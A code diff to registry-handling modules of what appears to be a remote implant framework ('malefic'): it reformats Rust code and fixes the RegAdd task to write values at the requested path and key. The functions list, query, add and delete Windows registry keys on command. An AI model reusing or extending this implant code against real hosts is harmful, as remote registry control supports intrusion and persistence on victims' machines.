@@ -1,15 +1,15 @@
-use crate::{Module, TaskResult, check_request, Result, Input, Output, check_field};
-use malefic_proto::proto::implantpb::{spite::Body};
+use crate::{check_field, check_request, Input, Module, Output, Result, TaskResult};
 use async_trait::async_trait;
 use malefic_helper::to_error;
-use malefic_trait::module_impl;
 use malefic_helper::win::reg::{RegistryKey, RegistryValue};
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_trait::module_impl;
 
 pub struct RegListKey {}
 
 #[async_trait]
 #[module_impl("reg_list_key")]
-impl Module for RegListKey{
+impl Module for RegListKey {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryRequest)?;
         let hive = check_field!(req.hive)?;
@@ -44,7 +44,6 @@ impl Module for RegListValue {
     }
 }
 
-
 pub struct RegQuery {}
 #[async_trait]
 #[module_impl("reg_query")]
@@ -71,30 +70,35 @@ impl Module for RegAdd {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryWriteRequest)?;
         let hive = check_field!(req.hive)?;
-        let subkey = check_field!(req.key)?;
-        
-        let reg_key = match RegistryKey::open(hive.parse()?, &*subkey) {
+        let path = check_field!(req.path)?;
+        let key = check_field!(req.key)?;
+
+        let reg_key = match RegistryKey::open(hive.parse()?, &*path) {
             Ok(key) => key,
-            Err(_) => RegistryKey::create(hive.parse()?, &*subkey)?,
+            Err(_) => RegistryKey::create(hive.parse()?, &*path)?,
         };
-        
+
         // 根据 regtype 设置不同类型的值
         match req.regtype {
-            1 => { // REG_SZ
+            1 => {
+                // REG_SZ
                 let string_value = check_field!(req.string_value)?;
-                reg_key.set_value(&*subkey, RegistryValue::String(string_value))?;
+                reg_key.set_value(&*key, RegistryValue::String(string_value))?;
             }
-            3 => { // REG_BINARY
+            3 => {
+                // REG_BINARY
                 let byte_value = check_field!(req.byte_value)?;
-                to_error!(reg_key.set_value(&*subkey, RegistryValue::Binary(byte_value.to_vec())))?;
+                to_error!(reg_key.set_value(&*key, RegistryValue::Binary(byte_value.to_vec())))?;
             }
-            4 => { // REG_DWORD
+            4 => {
+                // REG_DWORD
                 let dword_value = req.dword_value;
-                reg_key.set_value(&*subkey, RegistryValue::Dword(dword_value))?;
+                reg_key.set_value(&*key, RegistryValue::Dword(dword_value))?;
             }
-            11 => { // REG_QWORD
+            11 => {
+                // REG_QWORD
                 let qword_value = req.qword_value;
-                reg_key.set_value(&*subkey, RegistryValue::Qword(qword_value))?;
+                reg_key.set_value(&*key, RegistryValue::Qword(qword_value))?;
             }
             _ => return Err(anyhow::Error::msg("Unsupported registry value type").into()),
         }
@@ -102,7 +106,6 @@ impl Module for RegAdd {
         Ok(TaskResult::new(id))
     }
 }
-
 
 pub struct RegDelete {}
 
@@ -116,7 +119,7 @@ impl Module for RegDelete {
 
         let reg_key = RegistryKey::open(hive.parse()?, &*subkey)?;
         reg_key.delete_key(Some(&*subkey))?;
-        
+
         Ok(TaskResult::new(id))
     }
 }
